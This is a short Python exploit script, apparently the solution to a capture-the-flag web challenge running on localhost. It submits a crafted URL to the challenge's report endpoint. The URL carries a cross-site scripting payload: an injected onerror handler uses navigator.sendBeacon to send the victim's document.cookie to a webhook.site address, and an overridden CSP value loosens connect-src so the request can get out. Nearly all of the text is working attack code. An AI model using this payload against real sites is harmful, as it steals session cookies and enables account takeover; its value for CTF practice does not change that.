from requests import post

host = input("Enter challenge host (http://localhost:10001): ")
if host == "":
	host = "http://localhost:10001"

webhook = input("Enter webhook (https://webhook.site/f09ba59d-3f20-480e-b02c-e28014d91ac6): ")
if webhook == "":
	webhook = "https://webhook.site/f09ba59d-3f20-480e-b02c-e28014d91ac6"

solution = f"?text=a&unmodifiable[background]=a%27%20onerror=navigator.sendBeacon(%22{webhook}%22,document.cookie);%27&unmodifiable[CSP]=undefined;%20connect-src%20*;"

res = post(f"{host}/report", json={"text": solution})

if res.status_code == 200:
	print("Exploit successful!")
else:
	print("Exploit failed.")
	print(res.text)
